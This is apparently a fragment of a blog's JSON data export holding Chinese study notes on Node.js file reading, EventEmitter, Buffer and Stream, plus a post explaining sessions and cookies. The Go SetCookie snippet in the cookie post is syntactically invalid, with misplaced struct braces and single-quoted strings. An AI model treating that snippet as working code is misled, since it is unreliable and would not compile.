class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><br><span class=\"hljs-keyword\">var</span> fs=<span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">&quot;fs&quot;</span>);<br><span class=\"hljs-comment\">//将回调函数作为最后一个参数， 回调函数接收错误对象作为第一个参数。</span><br>fs.<span class=\"hljs-title function_\">readFile</span>(<span class=\"hljs-string\">&#x27;../../assets/test.txt&#x27;</span>,<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">err,data</span>)&#123;<br>    <span class=\"hljs-keyword\">if</span>(err) <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">error</span>(err);<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(data.<span class=\"hljs-title function_\">toString</span>());<br>&#125;);<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;程序执行完毕&quot;</span>);<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"3-EventEmitter\"><a href=\"#3-EventEmitter\" class=\"headerlink\" title=\"3.EventEmitter\"></a>3.EventEmitter</h3><blockquote>\n<p>Node.js得所有异步I/O操作都会在完成时返回一个事件到事件队列；</p>\n<p>Node.js里面得许多对象都会分发事件，所有这些事件得对象都是events.EventEmitter的实例；</p>\n</blockquote>\n<h4 id=\"EventEmitter类：事件触发与事件监听器功能的封装\"><a href=\"#EventEmitter类：事件触发与事件监听器功能的封装\" class=\"headerlink\" title=\"EventEmitter类：事件触发与事件监听器功能的封装\"></a>EventEmitter类：事件触发与事件监听器功能的封装</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">var</span> <span class=\"hljs-title class_\">EventEmitter</span>=<span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">&#x27;events&#x27;</span>).<span class=\"hljs-property\">EventEmitter</span>;<br><span class=\"hljs-keyword\">var</span> event=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">EventEmitter</span>();<br>event.<span class=\"hljs-title function_\">on</span>(<span class=\"hljs-string\">&#x27;some_event&#x27;</span>,<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&#x27;some_event 事件触发&#x27;</span>);<br>&#125;);<br>event.<span class=\"hljs-title function_\">on</span>(<span class=\"hljs-string\">&#x27;some_event&#x27;</span>,<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;Martin wang 的事件触发了&quot;</span>);<br>&#125;);<br><span class=\"hljs-built_in\">setTimeout</span>(<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>    event.<span class=\"hljs-title function_\">emit</span>(<span class=\"hljs-string\">&#x27;some_event&#x27;</span>);<br>&#125;,<span class=\"hljs-number\">1000</span>);<br></code></pre></td></tr></table></figure>\n\n<p>原理：event对象注册了事件some_event的一个监听器，然后1000ms后向event对象发送事件some_event此时调用其监听器；</p>\n<p>EventEmitter的每个事件由一个事件名和若干参数组成，事件名是一个字符串；每个事件支持若干个事件监听器；</p>\n<p>两个事件监听器回调函数被先后调用；</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">var</span> events=<span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">&#x27;events&#x27;</span>);<br><span class=\"hljs-keyword\">var</span> emitter=<span class=\"hljs-keyword\">new</span> events.<span class=\"hljs-title class_\">EventEmitter</span>();<br><br><span class=\"hljs-comment\">//监听器1</span><br><span class=\"hljs-keyword\">var</span> listener1=<span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">listener1</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&#x27;监听器listener1执行&#x27;</span>);<br>&#125;   <br><span class=\"hljs-comment\">//监听器2</span><br><span class=\"hljs-keyword\">var</span> listener2=<span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">listener2</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&#x27;监听器listener2执行&#x27;</span>);<br>&#125;<br><span class=\"hljs-comment\">//绑定connection事件，处理函数为listener1   </span><br>emitter.<span class=\"hljs-title function_\">addListener</span>(<span class=\"hljs-string\">&#x27;connection&#x27;</span>,listener1);<br><span class=\"hljs-comment\">//绑定connection事件，处理函数为listener2</span><br>emitter.<span class=\"hljs-title function_\">on</span>(<span class=\"hljs-string\">&#x27;connection&#x27;</span>,listener2);<br><span class=\"hljs-keyword\">var</span> eventListeners=<span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">&#x27;events&#x27;</span>).<span class=\"hljs-property\">EventEmitter</span>.<span class=\"hljs-title function_\">listenerCount</span>(emitter,<span class=\"hljs-string\">&#x27;connection&#x27;</span>);<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(eventListeners+<span class=\"hljs-string\">&quot;个监听器监听连接事件。&quot;</span>);<br><span class=\"hljs-comment\">//处理connection事件</span><br>emitter.<span class=\"hljs-title function_\">emit</span>(<span class=\"hljs-string\">&#x27;connection&#x27;</span>);<br><span class=\"hljs-comment\">//移除绑定的listener1函数   </span><br>emitter.<span class=\"hljs-title function_\">removeListener</span>(<span class=\"hljs-string\">&#x27;connection&#x27;</span>,listener1);<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;listener1不再受监听。&quot;</span>);<br><span class=\"hljs-comment\">//触发连接事件</span><br>emitter.<span class=\"hljs-title function_\">emit</span>(<span class=\"hljs-string\">&#x27;connection&#x27;</span>);<br>eventListeners=<span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">&#x27;events&#x27;</span>).<span class=\"hljs-property\">EventEmitter</span>.<span class=\"hljs-title function_\">listenerCount</span>(emitter,<span class=\"hljs-string\">&#x27;connection&#x27;</span>);<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(eventListeners+<span class=\"hljs-string\">&quot;个监听器监听连接事件。&quot;</span>);<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;程序执行完毕。&quot;</span>);<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"4-继承EventEmitter\"><a href=\"#4-继承EventEmitter\" class=\"headerlink\" title=\"4.继承EventEmitter\"></a>4.继承EventEmitter</h3><blockquote>\n<p>大多数时候我们不会直接使用 EventEmitter，而是在对象中继承它。包括 fs、net、 http 在内的，只要是支持事件响应的核心模块都是 EventEmitter 的子类。</p>\n<p>为什么要这样做呢？原因有两点：</p>\n<p>首先，具有某个实体功能的对象实现事件符合语义， 事件的监听和发生应该是一个对象的方法。</p>\n<p>其次 JavaScript 的对象机制是基于原型的，支持 部分多重继承，继承 EventEmitter 不会打乱对象原有的继承关系。</p>\n</blockquote>\n<h2 id=\"三、NodeJS-Buffer\"><a href=\"#三、NodeJS-Buffer\" class=\"headerlink\" title=\"三、NodeJS Buffer\"></a>三、NodeJS Buffer</h2><blockquote>\n<p>JS语言自身只有字符串数据类型，没有二进制数据类型；</p>\n<p>但是处理TCP流或者文件流时，必须使用二进制数据；因此NodeJS定义了一个Buffer类，创建一个专门存放二进制数据的缓存区；</p>\n</blockquote>\n<h3 id=\"1-Buffer与字符编码\"><a href=\"#1-Buffer与字符编码\" class=\"headerlink\" title=\"1.Buffer与字符编码\"></a>1.Buffer与字符编码</h3><blockquote>\n<p>Buffer实例一般用于表示编码字符的序列，比如UTF-8等；</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> buf=<span class=\"hljs-title class_\">Buffer</span>.<span class=\"hljs-title function_\">from</span>(<span class=\"hljs-string\">&#x27;hello world&#x27;</span>,<span class=\"hljs-string\">&#x27;ascii&#x27;</span>);<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(buf.<span class=\"hljs-title function_\">toString</span>(<span class=\"hljs-string\">&#x27;hex&#x27;</span>));<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(buf.<span class=\"hljs-title function_\">toString</span>(<span class=\"hljs-string\">&#x27;base64&#x27;</span>));<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-Buffer类\"><a href=\"#2-Buffer类\" class=\"headerlink\" title=\"2.Buffer类\"></a>2.Buffer类</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//创建长度为10字节的Buffer实例</span><br><span class=\"hljs-keyword\">const</span> buf1=<span class=\"hljs-title class_\">Buffer</span>.<span class=\"hljs-title function_\">alloc</span>(<span class=\"hljs-number\">10</span>);<br><span class=\"hljs-comment\">//创建长度为10字节，且用0填充的Buffer实例</span><br><span class=\"hljs-keyword\">const</span> buf2=<span class=\"hljs-title class_\">Buffer</span>.<span class=\"hljs-title function_\">alloc</span>(<span class=\"hljs-number\">10</span>,<span class=\"hljs-number\">1</span>);<br><span class=\"hljs-comment\">//创建长度为10字节，且未初始化的Buffer实例</span><br><span class=\"hljs-keyword\">const</span> buf3=<span class=\"hljs-title class_\">Buffer</span>.<span class=\"hljs-title function_\">allocUnsafe</span>(<span class=\"hljs-number\">10</span>);<br><span class=\"hljs-comment\">//创建一个包含[0x1,0x2,0x3]的Buffer实例</span><br><span class=\"hljs-keyword\">const</span> buf4=<span class=\"hljs-title class_\">Buffer</span>.<span class=\"hljs-title function_\">from</span>([<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span>,<span class=\"hljs-number\">3</span>]);<br><span class=\"hljs-comment\">//创建一个包含UTF-8字节[0x74,0x65,0x73,0x74]的Buffer实例</span><br><span class=\"hljs-keyword\">const</span> buf5=<span class=\"hljs-title class_\">Buffer</span>.<span class=\"hljs-title function_\">from</span>(<span class=\"hljs-string\">&#x27;test&#x27;</span>);<br><span class=\"hljs-comment\">//创建一个包含Latin-1字节[0x74,0x65,0x73,0x74]的Buffer实例</span><br><span class=\"hljs-keyword\">const</span> buf6=<span class=\"hljs-title class_\">Buffer</span>.<span class=\"hljs-title function_\">from</span>(<span class=\"hljs-string\">&#x27;test&#x27;</span>,<span class=\"hljs-string\">&#x27;latin1&#x27;</span>);<br><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"3-写入缓冲区\"><a href=\"#3-写入缓冲区\" class=\"headerlink\" title=\"3.写入缓冲区\"></a>3.写入缓冲区</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\">buf.<span class=\"hljs-title function_\">write</span>(string[,offset[,length]][,encoding])<br><span class=\"hljs-comment\">// string 字符串</span><br><span class=\"hljs-comment\">// offset 开始写入的索引值</span><br><span class=\"hljs-comment\">// length 写入的字节数</span><br><span class=\"hljs-comment\">// encoding 编码方式</span><br>buf.<span class=\"hljs-title function_\">write</span>(<span class=\"hljs-string\">&#x27;hello world&#x27;</span>);<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(buf.<span class=\"hljs-title function_\">toString</span>());<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(buf.<span class=\"hljs-title function_\">toJSON</span>());<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(buf.<span class=\"hljs-title function_\">toString</span>(<span class=\"hljs-string\">&#x27;base64&#x27;</span>));<br><span class=\"hljs-comment\">//缓冲区合并</span><br><span class=\"hljs-keyword\">const</span> buffer1=<span class=\"hljs-title class_\">Buffer</span>.<span class=\"hljs-title function_\">from</span>((<span class=\"hljs-string\">&#x27;菜鸟教程&#x27;</span>));<br><span class=\"hljs-keyword\">const</span> buffer2=<span class=\"hljs-title class_\">Buffer</span>.<span class=\"hljs-title function_\">from</span>((<span class=\"hljs-string\">&#x27;www.runoob.com&#x27;</span>));<br><span class=\"hljs-keyword\">const</span> buffer3=<span class=\"hljs-title class_\">Buffer</span>.<span class=\"hljs-title function_\">concat</span>([buffer1,buffer2]);<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;buffer3 内容: &quot;</span>+buffer3.<span class=\"hljs-title function_\">toString</span>());<br><span class=\"hljs-comment\">//缓冲区比较</span><br><span class=\"hljs-keyword\">const</span> buffer4=<span class=\"hljs-title class_\">Buffer</span>.<span class=\"hljs-title function_\">from</span>(<span class=\"hljs-string\">&#x27;ABC&#x27;</span>);<br><span class=\"hljs-keyword\">const</span> buffer5=<span class=\"hljs-title class_\">Buffer</span>.<span class=\"hljs-title function_\">from</span>(<span class=\"hljs-string\">&#x27;ABCD&#x27;</span>);<br><span class=\"hljs-keyword\">const</span> result=buffer4.<span class=\"hljs-title function_\">compare</span>(buffer5);<br><span class=\"hljs-keyword\">if</span>(result&lt;<span class=\"hljs-number\">0</span>)&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(buffer4+<span class=\"hljs-string\">&quot;在&quot;</span>+buffer5+<span class=\"hljs-string\">&quot;之前&quot;</span>);<br>&#125;<span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span>(result==<span class=\"hljs-number\">0</span>)&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(buffer4+<span class=\"hljs-string\">&quot;与&quot;</span>+buffer5+<span class=\"hljs-string\">&quot;相同&quot;</span>);<br>&#125;<span class=\"hljs-keyword\">else</span>&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(buffer4+<span class=\"hljs-string\">&quot;在&quot;</span>+buffer5+<span class=\"hljs-string\">&quot;之后&quot;</span>);<br>&#125;<br><span class=\"hljs-comment\">//拷贝缓冲区</span><br><span class=\"hljs-keyword\">const</span> buffer6=<span class=\"hljs-title class_\">Buffer</span>.<span class=\"hljs-title function_\">from</span>(<span class=\"hljs-string\">&#x27;ABC&#x27;</span>);<br><span class=\"hljs-comment\">//拷贝一个缓冲区</span><br><span class=\"hljs-keyword\">const</span> buffer7=<span class=\"hljs-title class_\">Buffer</span>.<span class=\"hljs-title function_\">alloc</span>(<span class=\"hljs-number\">3</span>);<br>buffer6.<span class=\"hljs-title function_\">copy</span>(buffer7);<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;buffer7 content: &quot;</span>+buffer7.<span class=\"hljs-title function_\">toString</span>());<br><span class=\"hljs-comment\">//缓冲区裁剪</span><br><span class=\"hljs-keyword\">const</span> buffer8=<span class=\"hljs-title class_\">Buffer</span>.<span class=\"hljs-title function_\">from</span>(<span class=\"hljs-string\">&#x27;runoob&#x27;</span>);<br><span class=\"hljs-comment\">//剪切缓冲区</span><br><span class=\"hljs-keyword\">const</span> buffer9=buffer8.<span class=\"hljs-title function_\">slice</span>(<span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">2</span>);<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;buffer9 content: &quot;</span>+buffer9.<span class=\"hljs-title function_\">toString</span>());<br></code></pre></td></tr></table></figure>\n\n<p>方法名参考JS的字符串处理；</p>\n<h2 id=\"四、NodeJS-Stream\"><a href=\"#四、NodeJS-Stream\" class=\"headerlink\" title=\"四、NodeJS Stream\"></a>四、NodeJS Stream</h2><blockquote>\n<p>Stream是一个抽象接口，node中很多对象实现了这个接口；</p>\n<p>例如对http服务器发起请求的request对象就是一个stream还有stdout；</p>\n</blockquote>\n"},{"title":"Session And Cookie","date":"2023-04-06T11:51:45.000Z","mp3":null,"cover":"img/bg10.jpg","_content":"\n\n# Session And Cookie\n\n## 一、Session和Cookie简介\n\n### 1.简介\n\n> Cookie的出现是因为http是无状态协议，服务器记不住访问者，刷新一次页面可能就需要输入账号密码重新登录；\n>\n> cookie作用就是让服务器认识你；\n\n- cookie可以认为是一个变量，形如name=value,存储在浏览器；\n- 一个session可以理解为一个数据结构，多数情况是`映射`，存储在服务器上；\n\n> cookie可以在服务器通过http的SetCookie字段设置Cookie；\n\n```go\nfunc cookie(w http.ResponseWriter, r *http.Request){\n    http.SetCookie(w,&http.Cookie){\n        Name:'Martin',\n        Value:'128'\n    }\n    \n      http.SetCookie(w,&http.Cookie){\n        Name:'Jacy',\n        Value:'129'\n    }\n}\n```\n\n> 当浏览器访问对应网址时，通过浏览器的开发者工具查看此次HTTP通信的喜姐，可以看见服务器的回应发出来两次SetCookie命令；\n>\n> 此后，浏览器请求中的Cookie都会带上这两个字段；\n\n### 2. cookie的问题\n\ncookie字段存储在HTTP Header中，如果cookie的信息越来越多，会消耗更多的带宽；\n\n### 3. session + cookie\n\n- 一个cookie存储一个变量 sessionID='123456';\n- 仅仅将一个cookie传递给服务器，服务器通过ID查询对应的session，这个session是一个数据结构，存储了各种用户的信息，有效解决了追踪用户的问题。\n- session是一个数据结构，由网站的开发者设计，可以承载各种数据；\n- 由于存储在服务器，所以session会有过期时间，一般是定期删除过期的session；\n\n## 二、Session的实现\n\n### 1.实现\n\n- Manager\n- Provider\n- Session\n\n![](https://s3.bmp.ovh/imgs/2023/04/06/d80d75f3d72fd150.png)\n\n1. 浏览器通过HTTP协议向服务器请求资源，对应路径上有个Handler函数接受请求，解析HTTPheader中的cookie，得到SessionID，发送给Manager；\n2. Manager充当session管理器的角色，主要存储一些配置信息，比如session存活时间，cookie的名字等；所有的session存在Manager内部的Provider中，Manager会把sessionID传递给Provider；\n3. Provider是一个容器，散列表，将sessionID和session一一对应，收到Manager的sid后，查询session并返回；\n4. Handler根据session中的信息，进行处理，返回对应的HTML信息；\n\n### 2.为什么要划分Manager、Provider、Session\n\n- session结构可能不止一个哈希表，还存储辅助数据等；\n- session可能有不同的存储方式：比如村粗缓存数据库redis或者存入Mysql；因此session结构提供一层抽象，屏蔽不同存储方式的差异；\n- Provider内部会很复杂，需要适应不同的算法比如LRU缓存淘汰算法，来存储session；\n-  Manager 主要就是⼀个参数集合，⽐如 session 的存活时间，清理过期 session 的策略，以及 session 的可⽤存储⽅式。 Manager 屏蔽了操作的具体 细节，我们可以通过 Manager 灵活地配置 session 机制。\n\n\n\n\n\n\n\n\n\n\n\n\n\n","source":"_posts/Session And Cookie.md","raw":"---\ntitle: Session And Cookie\ndate: 2023-04-06 19:51:45\ncategories: \n    - 前端\ntags: \n    - session\n    - cookie\nmp3: \ncover: img/bg10.jpg\n---\n\n\n# Session And Cookie\n\n## 一、Session和Cookie简介\n\n### 1.简介\n\n> Cookie的出现是因为http是无状态协议，服务器记不住访问者，刷新一次页面可能就需要输入账号密码重新登录；\n>\n> cookie作用就是让服务器认识你；\n\n- cookie可以认为是一个变量，形如name=value,存储在浏览器；\n- 一个session可以理解为一个数据结构，多数情况是`映射`，存储在服务器上；\n\n> cookie可以在服务器通过http的SetCookie字段设置Cookie；\n\n```go\nfunc cookie(w http.ResponseWriter, r *http.Request){\n    http.SetCookie(w,&http.Cookie){\n        Name:'Martin',\n        Value:'128'\n    }\n    \n      http.SetCookie(w,&http.Cookie){\n        Name:'Jacy',\n        Value:'129'\n    }\n}\n```\n\n> 当浏览器访问对应网址时，通过浏览器的开发者工具查看此次HTTP通信的喜姐，可以看见服务器的回应发出来两次SetCookie命令；\n>\n> 此后，浏览器请求中的Cookie都会带上这两个字段；\n\n### 2. cookie的问题\n\ncookie字段存储在HTTP Header中，如果cookie的信息越来越多，会消耗更多的带宽；\n\n### 3. session + cookie\n\n- 一个cookie存储一个变量 sessionID='123456';\n- 仅仅将一个cookie传递给服务器，服务器通过ID查询对应的session，这个session是一个数据结构，存储了各种用户的信息，有效解决了追踪用户的问题。\n- session是一个数据结构，由网站的开发者设计，可以承载各种数据；\n- 由于存储在服务器，所以session会有过期时间，一般是定期删除过期的session；\n\n## 二、Session的实现\n\n### 1.实现\n\n- Manager\n- Provider\n- Session\n\n![](https://s3.bmp.ovh/imgs/2023/04/06/d80d75f3d72fd150.png)\n\n1. 浏览器通过HTTP协议向服务器请求资源，对应路径上有个Handler函数接受请求，解析HTTPheader中的cookie，得到SessionID，发送给Manager；\n2. Manager充当session管理器的角色，主要存储一些配置信息，比如session存活时间，cookie的名字等；所有的session存在Manager内部的Provider中，Manager会把sessionID传递给Provider；\n3. Provider是一个容器，散列表，将sessionID和session一一对应，收到Manager的sid后，查询session并返回；\n4. Handler根据session中的信息，进行处理，返回对应的HTML信息；\n\n### 2.为什么要划分Manager、Provider、Session\n\n- session结构可能不止一个哈希表，还存储辅助数据等；\n- session可能有不同的存储方式：比如村粗缓存数据库redis或者存入Mysql；因此session结构提供一层抽象，屏蔽不同存储方式的差异；\n- Provider内部会很复杂，需要适应不同的算法比如LRU缓存淘汰算法，来存储session；\n-  Manager 主要就是⼀个参数集合，⽐如 session 的存活时间，清理过期 session 的策略，以及 session 的可⽤存储⽅式。 Manager 屏蔽了操作的具体 细节，我们可以通过 Manager 灵活地配置 session 机制。\n\n\n\n\n\n\n\n\n\n\n\n\n\n","slug":"Session And Cookie","published":1,"updated":"2023-04-06T03:26:21.125Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg4k4gqk0008ww9c2vwofoca","content":"<h1 id=\"Session-And-Cookie\"><a href=\"#Session-And-Cookie\" class=\"headerlink\" title=\"Session And Cookie\"></a>Session And Cookie</h1><h2 id=\"一、Session和Cookie简介\"><a href=\"#一、Session和Cookie简介\" class=\"headerlink\" title=\"一、Session和Cookie简介\"></a>一、Session和Cookie简介</h2><h3 id=\"1-简介\"><a href=\"#1-简介\" class=\"headerlink\" title=\"1.简介\"></a>1.简介</h3><blockquote>\n<p>Cookie的出现是因为http是无状态协议，服务器记不住访问者，刷新一次页面可能就需要输入账号密码重新登录；</p>\n<p>cookie作用就是让服务器认识你；</p>\n</blockquote>\n<ul>\n<li>cookie可以认为是一个变量，形如name=value,存储在浏览器；</li>\n<li>一个session可以理解为一个数据结构，多数情况是<code>映射</code>，存储在服务器上；</li>\n</ul>\n<blockquote>\n<p>cookie可以在服务器通过http的SetCookie字段设置Cookie；</p>\n</blockquote>\n<figure class=\"highlight go\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs go\"><span class=\"hljs-function\"><span class=\"hljs-keyword\">func</span> <span class=\"hljs-title\">cookie</span><span class=\"hljs-params\">(w http.ResponseWriter, r *http.Request)</span></span>&#123;<br>    http.SetCookie(w,&amp;http.Cookie)&#123;<br>        Name:<span class=\"hljs-string\">&#x27;Martin&#x27;</span>,<br>        Value:<span class=\"hljs-string\">&#x27;128&#x27;</span><br>    &#125;<br>    <br>      http.SetCookie(w,&amp;http.Cookie)&#123;<br>        Name:<span class=\"hljs-string\">&#x27;Jacy&#x27;</span>,<br>        Value:<span class=\"hljs-string\">&#x27;129&#x27;</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<blockquote>\n<p>当浏览器访问对应网址时，通过浏览器的开发者工具查看此次HTTP通信的喜姐，可以看见服务器的回应发出来两次SetCookie命令；</p>\n<p>此后，浏览器请求中的Cookie都会带上这两个字段；</p>\n</blockquote>\n<h3 id=\"2-cookie的问题\"><a href=\"#2-cookie的问题\" class=\"headerlink\" title=\"2. cookie的问题\"></a>2. cookie的问题</h3><p>cookie字段存储在HTTP Header中，如果cookie的信息越来越多，会消耗更多的带宽；</p>\n<h3 id=\"3-session-cookie\"><a href=\"#3-session-cookie\" class=\"headerlink\" title=\"3. session + cookie\"></a>3. session + cookie</h3><ul>\n<li>一个cookie存储一个变量 sessionID=’123456’;</li>\n<li>仅仅将一个cookie传递给服务器，服务器通过ID查询对应的session，这个session是一个数据结构，存储了各种用户的信息，有效解决了追踪用户的问题。</li>\n<li>session是一个数据结构，由网站的开发者设计，可以承载各种数据；</li>\n<li>由于存储在服务器，所以session会有过期时间，一般是定期删除过期的session；</li>\n</ul>\n<h2 id=\"二、Session的实现\"><a href=\"#二、Session的实现\" class=\"headerlink\" title=\"二、Session的实现\"></a>二、Session的实现</h2><h3 id=\"1-实现\"><a href=\"#1-实现\" class=\"headerlink\" title=\"1.实现\"></a>1.实现</h3><ul>\n<li>Manager</li>\n<li>Provider</li>\n<li>Session</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/04/06/d80d75f3d72fd150.png\"></p>\n<ol>\n<li>浏览器通过HTTP协议向服务器请求资源，对应路径上有个Handler函数接受请求，解析HTTPheader中的cookie，得到SessionID，发送给Manager；</li>\n<li>Manager充当session管理器的角色，主要存储一些配置信息，比如session存活时间，cookie的名字等；所有的session存在Manager内部的Provider中，Manager会把sessionID传递给Provider；</li>\n<li>Provider是一个容器，散列表，将sessionID和session一一对应，收到Manager的sid后，查询session并返回；</li>\n<li>Handler根据session中的信息，进行处理，返回对应的HTML信息；</li>\n</ol>\n<h3 id=\"2-为什么要划分Manager、Provider、Session\"><a href=\"#2-为什么要划分Manager、Provider、Session\" class=\"headerlink\" title=\"2.为什么要划分Manager、Provider、Session\"></a>2.为什么要划分Manager、Provider、Session</h3><ul>\n<li>session结构可能不止一个哈希表，还存储辅助数据等；</li>\n<li>session可能有不同的存储方式：比如村粗缓存数据库redis或者存入Mysql；因此session结构提供一层抽象，屏蔽不同存储方式的差异；</li>\n<li>Provider内部会很复杂，需要适应不同的算法比如LRU缓存淘汰算法，来存储session；</li>\n<li> Manager 主要就是⼀个参数集合，⽐如 session 的存活时间，清理过期 session 的策略，以及 session 的可⽤存储⽅式。 Manager 屏蔽了操作的具体 细节，我们可以通过 Manager 灵活地配置 session 机制。</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Session-And-Cookie\"><a href=\"#Session-And-Cookie\" class=\"headerlink\" title=\"Session And Cookie\"></a>Session And Cookie</h1><h2 id=\"一、Session和Cookie简介\"><a href=\"#一、Session和Cookie简介\" class=\"headerlink\" 